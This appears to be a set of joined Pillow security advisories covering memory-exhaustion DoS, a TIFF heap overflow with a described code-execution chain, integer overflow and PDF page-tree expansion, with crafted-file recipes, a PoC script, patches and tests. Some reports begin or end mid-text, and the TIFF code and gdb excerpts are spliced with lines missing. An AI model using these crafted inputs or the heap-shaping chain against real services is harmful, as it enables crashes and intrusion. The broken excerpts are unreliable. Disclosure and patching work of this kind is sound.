attack   dispose_op=1 OP_BACKGROUND  -> DecompressionBombError peak RSS  1864 MB Image.open() touched a full 22000x22000 canvas before the bomb check ran BUG ```  Both files are rejected, but the control is rejected at interpreter size. The attack file only reaches the bomb check after `Image.core.fill("RGBA", (22000, 22000))` has allocated and zero-filled about 1.9 GB. The script prints `BUG` if the attack child's peak RSS is at least 1000 MB and at least 20× the control's, or if the attack child is killed by `SIGKILL` (for example by the OOM killer on a small host). Otherwise it prints `OK`; any other non-zero child exit is treated as a harness failure, printed with the child's output, and also ends in `OK`. With either attached patch applied, both children report about 17–22 MB and the script prints `OK`.  The allocation grows with the header, so it can be scaled by changing `SIZE` in the script. The 45000×45000 case (an 8.1 GB canvas) is covered in Details and is not part of the script.  ## Suggested fix  Do not build the `OP_BACKGROUND` disposal image from the declared size during `_open()`. Two alternative patches are attached; both change only `src/PIL/PngImagePlugin.py`, and both add the same regression test to `Tests/test_file_apng.py` (a 2³¹−1 × 1 APNG built in memory with a 1×1 `OP_BACKGROUND` first frame must make `Image.open()` raise `DecompressionBombError`; on the current tree the fill fails first with `MemoryError`). ### Summary The MSP RLE decoder expands run-length data into an in-memory buffer with no cap tied to the declared image size. A small file that passes the pixel-count check can force hundreds of megabytes or more of allocation when the application loads pixels.  ### Details The MSP decoder writes each run into an unbounded `io.BytesIO` and can expand roughly 85x per run:  - `src/PIL/MspImagePlugin.py:144-146`  ### Impact Memory-exhaustion denial of service from a tiny crafted image in any application that loads pixels. The expansion is decoupled from the declared pixel count, so `MAX_IMAGE_PIXELS` does not bound it.

``` ============================================================================ Heap buffer overflow in _tiffWriteProc when saving TIFF to BytesIO Location: src/libImaging/TiffDecode.c:94  in _tiffWriteProc() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  Pillow can write attacker-chosen data past the end of a heap buffer when it saves a TIFF image to an in-memory destination such as `io.BytesIO` rather than to a file. The same code also copies leftover heap memory from the process into the saved file. Anyone who can supply an image to a service that opens it and re-saves it as TIFF this way can trigger this with default settings. The attached reproducer crashes the process, and the overflow could potentially be developed further, but code execution is not demonstrated here.  The bug is in `_tiffWriteProc` in `src/libImaging/TiffDecode.c`. This is the write callback for the in-memory sink that Pillow gives libtiff whenever the save target has no `fileno()`. While writing the directory, libtiff seeks past the current end of data and writes tag values there. `_tiffWriteProc` sizes its `realloc()` from `state->size + size` instead of from the write position `state->loc`. As a result, the first out-of-line tag value written after that seek can run past the allocation by up to the size of the directory: 12 bytes per entry, 126 bytes in the minimal case, and 2384 bytes observed with a 331-entry directory. The overflowing bytes are the tail of a tag value taken from the uploaded file.  No save options are needed, because compression and tags are inherited from the source image. The overflow does require an attacker-sized out-of-line tag to reach libtiff. That happens when the opened TIFF is saved directly (ImageDescription, DocumentName or XMP), or through an embedded ICC profile, which survives `copy()` in `im.info`. The bytes libtiff skips for alignment are never initialised, so any compressed TIFF over 64 KiB written this way also leaks one stale heap byte per padding hole. That leak needs no crafted tag.  The attached reproducer builds a 131 KB PackBits TIFF and runs `Image.open(...).save(io.BytesIO(), "TIFF")`. Saving the same image to a file path succeeds, but the `BytesIO` save aborts with glibc's `malloc(): corrupted top size`. A second part of the script shows uninitialised heap bytes at the padding offsets of a `BytesIO` save that are zero in the file save. Saves to real files are unaffected. The defect dates to e782fe721e01 (2013) and has been present since Pillow 2.0.0.  ## Details  When `im.save()` writes a TIFF through libtiff to a target that has no usable `fileno()` (`io.BytesIO`, an HTTP response object, a storage backend stream), libtiff is opened with `TIFFClientOpen()` on Pillow's own in-memory sink, `_tiffWriteProc` / `_tiffSeekProc` in `src/libImaging/TiffDecode.c`. libtiff treats that sink like a file: when it writes the directory it seeks *beyond* the current end of data (to `eof + IFD size`, where the out-of-line tag values go, and one byte further after every odd-length tag value to keep offsets even) and writes there. On a real file the kernel grows the file and zero-fills the gap. The memory sink does neither correctly:  1. `_tiffWriteProc` sizes its `realloc()` from `state->size + size` instead of `state->loc + size`, so the first write after such a seek can land past the end of the new allocation — a heap buffer overflow whose content is tag data taken from the image being saved. 2. The bytes that libtiff skips are never written, and the grown region is a bare `realloc()`, so they reach the output TIFF with whatever the heap held before.  Both are reachable with default settings by the ordinary "re-encode the upload" sequence `Image.open(upload); im.save(io.BytesIO(), "TIFF")` with no save options: `compression` defaults to the source file's (`src/PIL/TiffImagePlugin.py:1734`), any compression other than raw selects the libtiff writer (`:1746`), the source's `tag_v2` entries are passed through to libtiff (`:1959`), and a target without `fileno()` leaves `_fp = 0` (`:1928-1935`), i.e. the memory sink. The overflow half additionally needs an attacker-controlled out-of-line tag value of the right length to reach libtiff. With the opened `TiffImageFile` saved directly (`tag_v2` passthrough) that can be a ~64 KiB ASCII tag (269/270/271/272) or the XMP packet (tag 700, type BYTE — arbitrary bytes), and the number of tags the upload carries sets the IFD size, i.e. the overrun length (12 bytes per entry; 2384 bytes with a 331-entry IFD observed). After `convert()`/`resize()`/`thumbnail()`/`copy()` the `tag_v2` entries are gone, but `im.info["compression"]` (still selecting libtiff) and `im.info["icc_profile"]` survive and the ICC profile is written as tag 34675 (`:1822-1824`), an equally attacker-controlled out-of-line value: `Image.open(x).copy().save(BytesIO(), "TIFF")` with the payload in the ICC profile produces the identical ASan report. The stale-byte half needs no attacker tag at all.  **Proof (overflow).** A 131 198-byte hand-built TIFF — mode L, 7×8191, `Compression=32773` (PackBits), an `ImageDescription` of 65 535 characters — opened with `Image.open()` and saved with `im.save(io.BytesIO(), "TIFF")` aborts a stock build with glibc's `malloc(): corrupted top size`. The same call against an AddressSanitizer build of the C extensions reports  ``` AddressSanitizer: heap-buffer-overflow ... WRITE of size 65536  #1 _tiffWriteProc src/libImaging/TiffDecode.c:115  #4 TIFFFlush  #5 ImagingLibTiffEncode src/libImaging/TiffDecode.c:1056 0 bytes to the right of 131072-byte region, allocated by realloc in _tiffWriteProc src/libImaging/TiffDecode.c:103 ```  **Proof (uninitialised bytes).** Saving one 300×300 RGB image as `compression="tiff_lzw"` with four odd-length ASCII tags to a `BytesIO`, once with `MALLOC_PERTURB_=1` (glibc fills fresh allocations with 0xfe) and once with `MALLOC_PERTURB_=170` (0x55), gives two 369 463-byte TIFFs that differ in exactly 4 bytes, 0xfe vs 0x55, at offsets 369177, 369417, 369423, 369451 — the pad byte between the odd-length last strip and the IFD, and the pad byte after each odd-length tag value except the last. The same save to a filename gives byte-identical files with 0x00 there. Without any allocator tweaks, after a few 64 KB–400 KB Python `bytes` objects filled with 0xa7 are created and freed, re-saving an uploaded LZW TIFF carrying ten odd-length ASCII tags yields 0xa7 at all nine pad offsets.  ### Code walk-through  The sink's state is `{data, size (allocated), loc (position), eof (high-water mark)}`; the encoder path starts it as a zeroed 64 KiB block (`TiffDecode.c:863`, `calloc(bufsize, 1)` with `bufsize = 64*1024`, `flrealloc = 1`). Seeking is unconstrained:  ```c /* src/libImaging/TiffDecode.c:124-141  _tiffSeekProc */     case 0: state->loc = off;            break;   /* may exceed eof and size */     case 1: state->loc += off;           break;     case 2: state->loc = state->eof + off; break; ```  and writing assumes `loc <= size`:  ```c /* src/libImaging/TiffDecode.c:90-117  _tiffWriteProc */     to_write = MIN(size, state->size - (tsize_t)state->loc);         }         new_data = realloc(state->data, newsize);              /* tail left uninitialised */         …         state->size = newsize;         to_write = size;     }     _TIFFmemcpy((UINT8 *)state->data + state->loc, buf, to_write);   /* :115 */     state->loc += (toff_t)to_write;     state->eof = MAX(state->loc, state->eof); ```  A gdb trace of the sink calls during the overflowing save (stock build, breakpoints on the two procs) shows how libtiff drives it:  ``` write size=63064 at loc=8      (eof=8     size=65536)     strip data (PackBits re-encode: write size=2464  at loc=63072  (eof=63072 size=65536)      8 bytes/row × 8191 rows) seek  off=0     whence=2       -> loc=65536 = eof = size   TIFFWriteDirectory: end of data, already even seek  off=4; `ImagingLibTiffEncode` later sets `size = eof` (`:1067`) and copies `[0, eof)` out of the same block (`:1073`), reading past it as well.  The general condition is: at directory-write time the strip data ends within *IFD-size* bytes of the current allocation boundary, and the first out-of-line tag value has a length just below a multiple of 64 KiB. The overrun length is `IFD size + pad − slack`, so it grows by 12 bytes per additional tag. For single-band images (L, P, 1, I;16, F…) `BitsPerSample` is stored inline and the first out-of-line value in tag order is `DocumentName` (269) or `ImageDescription` (270) — both free-length ASCII strings taken from the source file. Pillow re-encodes the pixels itself, but with PackBits the compressed size is a deterministic function of attacker-chosen pixel rows (the reproducer uses rows of 7 distinct bytes → 8 bytes per row → exactly 65536 bytes including the 8-byte header), so the attacker controls both quantities. For multi-band images the 6-byte `BitsPerSample` array is written first and absorbs the growth, which is why RGB sources do not hit the overflow.  The disclosure half is the benign version of the same sequence. In the LZW/RGB trace the strip data ends at the odd offset 369177; libtiff places the IFD at 369178 and the tag values from 369364 on, and after each odd-length value seeks one byte forward before the next write (`seek off=369418 (loc=369417)`, `write size=5 at loc=369418`, …). Offsets 369177, 369417, 369423 and 369451 are therefore never written. They lie in the part of the buffer obtained by the `realloc()` calls at `:103` (the block grew 65536 → 196608 → 327680 → 458752 during the strip writes), which is not cleared, so the emitted file carries the previous heap contents at those positions. Holes that fall inside the initial 64 KiB are zero only because that block is `calloc`'d.  The defect was introduced in e782fe721e01 ("initial merge of wiredfool/Python-Imaging-Library-G4-Tiff-Support", 2013-03-08), first released in Pillow 2.0.0.  ## Impact  Any service that accepts an image and produces a TIFF rendition into a non-file object — the usual pattern for returning or uploading the result without touching disk — is exposed to whoever supplies the image, with no non-default Pillow setting involved. The overflow additionally requires that an attacker-controlled out-of-line tag value reaches libtiff: the uploaded ImageDescription/DocumentName/XMP when the application saves the opened TIFF itself (or copies its tags into the save), or the embedded ICC profile, which survives `convert()`/`resize()`/`thumbnail()`/`copy()` in `im.info` together with the compression. Under those conditions, with a crafted single-band TIFF the uploader gets a heap out-of-bounds write in the worker process of IFD-size bytes (12 bytes per directory entry the upload carries — 126 bytes with the minimal reproducer, 2384 bytes with a 331-entry IFD) immediately past a 128 KiB-class `realloc` block, with the overwritten bytes being the tail of a tag value they chose; on the stock build the minimal reproducer is detected by glibc and kills the process (`SIGABRT`).  Given two addresses leaked by a separate bug, this write has been turned into code execution against a stock build of this commit with ASLR/PIE/NX enabled and default settings (that proof-of-concept is not included with this report): a single-process stdlib `http.server` worker doing nothing but `Image.open(BytesIO(body)).save(BytesIO(), "TIFF")` per upload executed an attacker-chosen shell command (`id>/tmp/r.XXXXXX`), answered `200` and kept serving (12/12 against a freshly started worker, 2/6 after twenty unrelated uploads; a miss normally leaves the worker running and is retryable). The two addresses (`&system`, `&PyBytes_Type`) were taken from an unrelated information disclosure in the same process; everything else is this bug plus properties of Pillow's TIFF reader used as a heap-shaping script. The 4.7 MB attack TIFF is a 397×165 8-bit PackBits image whose rows re-encode to exactly 65 528 bytes (strip ends at sink offset 65 536), a 63 942-byte XMP packet (tag 700) as the first out-of-line value, and ~500 private IFD entries. Because `TiffImagePlugin` turns every IFD entry into one `bytes` object in IFD order, frees an earlier entry when a later one repeats its tag number, and parses the IFD three times per request (`TiffImagePlugin.py:1258`, `:1271`, and `getexif()` from `load_end()` at `:1331`), those entries drain glibc's free lists, punch exact-size holes for every large allocation the save makes, and arrange that the 128 KiB `realloc` of the sink lands directly below a live 0x540 chunk followed by libtiff's own `TIFF` handle (`malloc(1313)` from `TIFFClientOpen`). The 2384 overflowing bytes rewrite the start of the `TIFF` struct with the command string, a zeroed `tif_dir`, `tif_diroff = 65536`, and `tif_cleanup = system` at +0x3f8; libtiff resumes `TIFFWriteDirectorySec` on the modified handle and calls `(*tif->tif_cleanup)(tif)`. With gdb on `__libc_system` the call arrives as `__libc_system("id>/tmp/r.…") ← libtiff.so.6 ← TIFFFlush ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1056) ← _encode (src/encode.c:139)`. Offsets are per-binary constants (glibc 2.36, CPython 3.12.14, libtiff 4.5.0, this `_imaging.so`), all obtainable from public distribution files.  Independently, every compressed TIFF written to such a target that exceeds 64 KiB discloses one byte of stale heap per alignment hole (one per odd-length tag value plus possibly one before the IFD; the count is set by the tags in the uploaded file) at predictable offsets in the returned file — low bandwidth, but it is other requests' freed data. File-path and real-fd targets (`TIFFFdOpen`) are unaffected by either issue. The primitive is the same class and attacker position as the `TiffDecode.c` decode-side heap overflows CVE-2020-35654, CVE-2021-25289 and CVE-2020-10379, but on the encode path and behind the output-to-a-non-file and tag-passthrough preconditions above, with code execution additionally depending on an address leak from another bug.  ## Reproducing  `repro` is a single Python script that uses the installed Pillow, writes its inputs into a temporary directory. It has two parts. Each part compares saving to a file path, which goes through `TIFFFdOpen` and is correct, with the same save into an `io.BytesIO`, which goes through the `_tiffWriteProc` memory sink.  **Part 1: heap overflow.** `setup_env()` builds `upload.tif` (131 198 bytes) byte by byte: a mode L, 7×8191 image with `Compression=32773` (PackBits) and a 65 535-character `ImageDescription`. The sizes are picked so that when Pillow re-encodes the pixels, the strip comes to 8 + 8191 × 8 = 65 536 bytes and ends exactly at the sink's initial 64 KiB buffer. libtiff then seeks past the 126-byte IFD and writes the 65 536-byte description at offset 65 662. The sink grows only to 131 072 bytes, so the last 126 bytes of the description are written past the end of the heap block. In a fresh child process, the script runs `Image.open("upload.tif").save(<target>, "TIFF")` with no options, once with `"out.tif"` as the target and once with `io.BytesIO()`. The file save exits with 0. The BytesIO save is killed by SIGABRT, with glibc reporting `malloc(): corrupted top size`.  **Part 2: stale heap bytes in the output.** A child started with `MALLOC_PERTURB_=170` (glibc fills fresh allocations with 0x55) saves a seeded-noise 300×300 RGB image with `compression="tiff_lzw"` and four odd-length ASCII tags. It saves once to a file and once to a BytesIO, then prints every offset where the two outputs differ. libtiff skips one pad byte before the IFD and one after each odd-length tag value. The file has 0x00 at those offsets, but the BytesIO output still holds the 0x55 that was in uninitialised `realloc()` memory.  Expected output on this tree:  ``` upload.tif: 131198 bytes save to file path : exit code 0, out.tif = 131210 bytes save to BytesIO   : exit code -6, stderr: 'malloc(): corrupted top size' -> heap overflow crashed the process: True  same image, same options, saved to a file path vs. to a BytesIO:   offset 369177: file 0x00   BytesIO 0x55   offset 369417: file 0x00   BytesIO 0x55   offset 369423: file 0x00   BytesIO 0x55   offset 369451: file 0x00   BytesIO 0x55  -> BytesIO output contains never-written heap bytes: True  BUG ```  The last line is `BUG` if either part shows its defect, and `OK` otherwise. With the attached patch applied and rebuilt, the BytesIO save exits with 0, the two outputs are identical, and the script prints `OK`.  ## Suggested fix  The attached patch makes `_tiffWriteProc` in `src/libImaging/TiffDecode.c` honour sparse-file semantics: it sizes the buffer from the write position, and zeroes what `realloc()` adds (the initial block is already `calloc`'d, so every byte libtiff skips then reads as 0, exactly as through `TIFFFdOpen`). For the non-reallocating case (`flrealloc == 0`), where `loc > size` would also make `to_write` negative, it rejects the write with a `TIFFError`, the same idiom `_tiffReadProc` uses:  ```diff -        while (newsize < (size + state->size)) { +        while (newsize < (size + (tsize_t)state->loc)) {  … +        memset((UINT8 *)new_data + state->size, 0, newsize - state->size);          state->data = new_data;          state->size = newsize;          to_write = size; +    } else if (to_write < 0) { +        TIFFError("_tiffWriteProc", "Invalid Write at loc %" PRIu64 ", size: %" PRIu64, …); +        return 0;      } ```  `_tiffSeekProc` is left unconstrained, since libtiff legitimately seeks past the end of data; with the write proc fixed, `eof` can no longer exceed `size`, so the read-out in `ImagingLibTiffEncode` (`:1067`, `:1073`) stays within the block. With the patch applied and rebuilt, the BytesIO output is byte-identical to the file output, no AddressSanitizer report is produced for tag lengths 65410/65535/131071/196607, the code-execution chain described under Impact no longer runs its command, and the existing TIFF tests pass.  ## The patch  Size the libtiff in-memory write buffer from the write position, not its current size, and zero the space added by realloc in _tiffWriteProc  Applies to `src/libImaging/TiffDecode.c` at the commit above.  ```diff diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py index 3d804ea4a..d2a926a62 100644 --- a/Tests/test_file_libtiff.py +++ b/Tests/test_file_libtiff.py @@ -760,6 +760,38 @@ class TestFileLibTiff(LibTiffTestCase):          save_bytesio("packbits")          save_bytesio("tiff_lzw")   +    def test_save_bytesio_seek_past_end(self, tmp_path: Path) -> None: +        # When writing the directory, libtiff seeks past the end of the data +        # written so far, and then writes the tag values there. ## Summary BmpRleDecoder can be forced to allocate gigabytes of memory from a kilobyte-sized crafted BMP file via unbounded growth in the delta escape and absolute mode branches.  ## Affected versions All versions up to and including current HEAD (v13.0.0.dev0, commit e7a7ea84)  ## Root cause BmpRleDecoder.decode() (BmpImagePlugin.py:327-395) builds a Python bytearray `data` with dest_length = xsize*ysize, looping `while len(data) < dest_length`. The loop condition is only checked at the TOP; individual branches append attacker-controlled amounts UNBOUNDED by dest_length:  - delta escape (line 370): data += b"\x00" * (right + up * self.state.xsize) with right,up in 0..255 -> up to ~255*xsize bytes in ONE iteration. - absolute mode (line 385): data += bytes_read (up to 255).  Because a single delta can push len(data) to ~256 * (row size), a tiny RLE stream combined with a large-but-legal xsize (xsize*ysize just under MAX_IMAGE_PIXELS, ~89M) yields a multi-GB `data` bytearray (then copied again by bytes(data) and set_as_raw). No heap OOB (bytearray/set_as_raw are bounds-safe), but a severe memory-amplification DoS: the attacker file stays tiny.  ## Reproduction Python 3.13, Pillow HEAD e7a7ea84  Attached: pillow_poc_bmp_rle_dos.py  A 1084-byte BMP (BI_RLE8, width=3,000,000, height=1 -> 3M px, passes bomb check) with one delta escape (00 02 00 150) produces ~429 MB `data`; measured peak RSS 911 MB. Scaling width toward the bomb limit and up=255 produces tens of GB from a ~1 KB file.  ## Suggested fix Cap growth at dest_length in the delta and absolute branches, e.g. clamp the delta fill to (dest_length - len(data)) and stop appending once len(data) >= dest_length; reject deltas that would move the cursor beyond the image, matching the existing per-row clamp at line 341-343. ### Summary Affected Object and Source  Package: Pillow 12.3.0 Source: PyPI sdist pillow-12.3.0.tar.gz SHA-256: 3b8182a766685eaa002637e28b4ec8d6b18819a0c71f579bf0dbaa5830297cce Sink: src/_imaging.c:2809:15, xsize += dx  ### Details The code in Pillow 12.3.0 is: ```c for (xsize = 0; *text; text++) {     int dx = self->glyphs[*text].dx;     if (dx > 0 && xsize > INT_MAX - dx) {         PyErr_SetString(PyExc_OverflowError, "Width too large");         return -1;     }     xsize += dx; } ``` The PILfont glyph advance is parsed from a signed 16-bit field, so the valid range for `dx` is `[-32768, 32767]`. The existing check only proves: `dx > 0 => xsize <= INT_MAX - dx` It does **not** prove the other half of the contract: `dx < 0 => xsize >= INT_MIN - dx` Taking `dx = -32768` and repeating it 65,537 times, the mathematical sum is `-2,147,516,416`, which is less than `INT_MIN = -2,147,483,648`. On the 65,537th addition, the operation `-2147483648 + -32768` is performed, resulting in **C signed overflow undefined behavior**.  ### PoC ```python """Minimal public-API reproducer for the Pillow 12.3.0 textwidth underflow.  Run with an ordinary Pillow 12.3.0 build to observe the wrapped width, or with the PyC-Contract UBSan build to obtain the exact native diagnostic. """  from __future__ import annotations  import struct from io import BytesIO  import PIL from PIL import Image, ImageFont   ADVANCE = -(2**15) CONTROL_REPEAT = 65_536 WITNESS_REPEAT = 65_537   def bitmap_font(advance: int) -> ImageFont.ImageFont:     metrics = bytearray(256 * 20)     glyph_offset = ord("A") * 20     metrics[glyph_offset : glyph_offset + 2] = struct.pack(">h", advance)     font_data = b"PILfont
;;;;;;1;
DATA
" + bytes(metrics)     font = ImageFont.ImageFont()     font._load_pilfont_data(BytesIO(font_data), Image.new("1", (1, 1)))     return font   def main() -> None:     font = bitmap_font(ADVANCE)     print(f"Pillow={PIL.__version__}")     print(f"control_math={ADVANCE * CONTROL_REPEAT}")     print(f"control_return={font.getlength('A' * CONTROL_REPEAT)}")     print(f"witness_math={ADVANCE * WITNESS_REPEAT}")     print(f"witness_return={font.getlength('A' * WITNESS_REPEAT)}")   if __name__ == "__main__":     main() ```  Observations from a regular 12.3.0 release build:  ```text Pillow=12.3.0 control_math=-2147483648 control_return=0 witness_math=-2147516416 witness_return=2147450880 ```  The adjacent control uses 65,536 repetitions, producing a mathematical result of exactly `INT_MIN`, and the function subsequently returns 0 according to existing semantics. Adding just a single character flips the return value to `2,147,450,880`.   ### Impact The directly confirmed impact is width semantic integrity violation: getlength() and boundary calculations based on getsize() may return a huge positive value, while the true mathematical width is negative. The high-level getmask() typically passes through the decompression-bomb check, which mitigates the risk of direct massive allocation; however, internal font objects and applications that use the width for layout, quotas, serialization, or subsequent allocations may be affected by resource consumption or logic errors.  Therefore, the current recommended severity rating is "Reachable native integer undefined behavior, with potential DoS/logic integrity impact; specific security severity to be confirmed by the upstream threat model", rather than a memory corruption vulnerability.  ### Recommended Patch and Regression Tests  It is recommended to extend the overflow check to cover both directions: ```c if ((dx > 0 && xsize > INT_MAX - dx) ||     (dx < 0 && xsize < INT_MIN - dx)) {     PyErr_SetString(PyExc_OverflowError, "Width too large");     return -1; } ``` At a minimum, four test cases should be added: 1. `dx = 32767, repeat = 65538` — upper adjacent control (should succeed); 2. `dx = 32767, repeat = 65539` — should raise `OverflowError`; 3. `dx = -32768, repeat = 65536` — lower adjacent control (should succeed); 4. `dx = -32768, repeat = 65537` — should raise `OverflowError`.  Additionally, it should be verified that exception propagation is consistent across `getlength()`, `getbbox()`, `getmask()`, and the underlying `font.getsize()`.

### Summary Pillow's documented PDF append path can spend disproportionate CPU time on a compact malformed PDF page tree.  An attacker who can supply an existing PDF to an application that appends an image with `Image.save(..., format="PDF", append=True)` can provide a malformed `/Pages` tree where each level repeats the same child `/Pages` reference in `/Kids`. Pillow treats the graph as a tree and expands each repeated reference in `PdfParser.linearize_page_tree()` without tracking visited or duplicate indirect references.  In the bounded proof below, a `1410`-byte PDF expands to `8192` page references from one distinct page object and takes about `9.6` seconds through the append path. A comparable linear control with the same depth stays at one page reference and completes in about `0.02` seconds.  This is in scope for Pillow's security policy because it is reproducible in `main`, affects the latest public release tested (`12.3.0`), and is not just an unexpected Python exception. The vulnerable operation accepts attacker-controlled PDF bytes through Pillow's PDF parser and causes deterministic resource consumption before normal completion.  ### Details  #### Affected versions  - Package: `Pillow` - Ecosystem: `pip` / PyPI - Affected component: `src/PIL/PdfParser.py` page-tree traversal reached from `src/PIL/PdfImagePlugin.py` PDF append handling - Runtime-tested affected release: `12.3.0` - Runtime-tested affected development version: `13.0.0.dev0` - Tested commit: `b39b9649312fbc381060e8c7c7f9f0de4cc63daa` - Current source artifact hash: `sha256(git archive --format=tar HEAD) = 2ccefca23d432456765be8d3c34564c65ba016b0c9da1e44ca389762f7eda054` - Release `12.3.0` commit: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d` - Release `12.3.0` source artifact hash: `sha256(git archive --format=tar 12.3.0) = 94bed33fd20123938dbc0153d295250bb4e3c09251b6d4a34f7595e25d409c81` - Source-level affected: `5.1.0`, `12.2.0`, `12.3.0`, and `HEAD` - Likely affected range: `>= 5.1.0` - Patched versions: none known  Evidence fact strings:  - Runtime-tested affected: 12.3.0 - Runtime-tested affected: 13.0.0.dev0 at b39b9649312fbc381060e8c7c7f9f0de4cc63daa - Source-level affected: 5.1.0 - Source-level affected: 12.2.0 - Source-level affected: HEAD - Likely affected range: >= 5.1.0, no fixed version known - Pre-boundary note: 5.0.0 has PdfImagePlugin.py but no src/PIL/PdfParser.py  `5.0.0` contains `src/PIL/PdfImagePlugin.py` but does not contain `src/PIL/PdfParser.py`. `PdfParser.py` was introduced by `6207b44ab1ff4a91d8ddc7579619876d0bb191a4` (`2018-01-18 issue #2959: support appending to existing PDFs`), which shipped in `5.1.0`.  #### Technical details  The reachable path is:  1. A service or application receives an attacker-influenced existing PDF and appends an image using Pillow's public PDF save path:     ```python    Image.new("L", (1, 1), 0).save(existing_pdf_file, format="PDF", append=True)    ```  2. `src/PIL/PdfImagePlugin.py` routes `append=True` to `PdfParser`:     ```python    is_appending = im.encoderinfo.get("append", False)    filename_str = filename.decode() if isinstance(filename, bytes) else filename    if is_appending:        existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode="r+b")    else:        existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode="w+b")    ```  3. `src/PIL/PdfParser.py` parses the existing PDF and linearizes the page tree:     ```python    self.page_tree_root = self.read_indirect(self.pages_ref)    self.pages = self.linearize_page_tree(self.page_tree_root)    self.orig_pages = self.pages[:]    ```  4. `linearize_page_tree()` recursively follows every `/Kids` entry and extends the page list. It does not track page-tree node identity, duplicate references, or active traversal references:     ```python    def linearize_page_tree(        self, node: PdfDict | None = None    ) -> list[IndirectReference]:        page_node = node if node is not None else self.page_tree_root        check_format_condition(            page_node[b"Type"] == b"Pages", "/Type of page tree node is not /Pages"        )        pages = []        for kid in page_node[b"Kids"]:            kid_object = self.read_indirect(kid)            if kid_object[b"Type"] == b"Page":                pages.append(kid)            else:                pages.extend(self.linearize_page_tree(node=kid_object))        return pages    ```  5. During append, `rewrite_pages()` then iterates the expanded `orig_pages` list and scans/replaces entries in `self.pages`, adding more cost to the already expanded duplicate-reference list.  The missing invariant is:  ```text The PDF page tree should be treated as an acyclic tree of unique indirect references before Pillow builds pages/orig_pages or rewrites pages. ```  The proof intentionally uses a malformed PDF page-tree DAG: each `/Pages` node repeats the same next `/Pages` child reference twice. Pillow accepts this graph and expands it as if the repeated reference represented distinct subtrees.  ### PoC  Environment used for validation:  - OS/runtime: Linux, Python `3.13.11` - Current tested build: Pillow `13.0.0.dev0`, commit `b39b9649312fbc381060e8c7c7f9f0de4cc63daa` - Latest release tested: Pillow `12.3.0` - The proof uses only synthetic in-memory PDFs and does not contact the network. distinct_refs,         "parse_seconds": round(parse_seconds, 6),         "append_seconds": round(append_seconds, 6),         "output_bytes_after_append": len(output.getvalue()),     }   def main() -> int:     depth = int(sys.argv[1]) if len(sys.argv) > 1 else 12     if not 0 <= depth <= 16:         raise SystemExit("depth must be between 0 and 16")      linear = run_case(depth, fanout=1)
